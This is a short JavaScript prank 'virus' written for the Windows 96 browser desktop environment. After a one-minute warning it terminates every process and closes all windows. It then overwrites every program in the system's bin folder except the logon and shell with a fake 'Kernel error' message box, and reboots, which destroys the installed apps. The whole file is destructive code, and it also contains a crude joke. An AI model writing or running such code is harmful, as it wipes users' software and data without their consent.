alert("1 minute of computer left..")

setTimeout(async () => {
    w96.state.processes.forEach((proc) => {
        if (proc) {
            proc.terminate()
        }
    });
    w96.WindowSystem.closeAllWindows();
    w96.ui.DialogCreator.progress('Doing your mom..');
    await w96.util.wait(5000);
    var apps = await w96.FS.readdir('C:/system/local/bin');
    
    function deleteAppFromList(p) {
        var i;
        i = apps.indexOf(p);
        eval('delete apps[' + i.toString() + ']');
        apps[i] = apps.pop();
    }
    deleteAppFromList('C:/system/local/bin/logon');
    deleteAppFromList('C:/system/local/bin/shell36');
    await apps.forEach(async (i) => await w96.FS.writestr(i, 'w96.ui.MsgBoxSimple.error(\'Kernel error\',\'Basically, no.\',\'Dayum i cant do anything\').dlg.randomizePosition()'));
    w96.sys.reboot();
}, 60000);
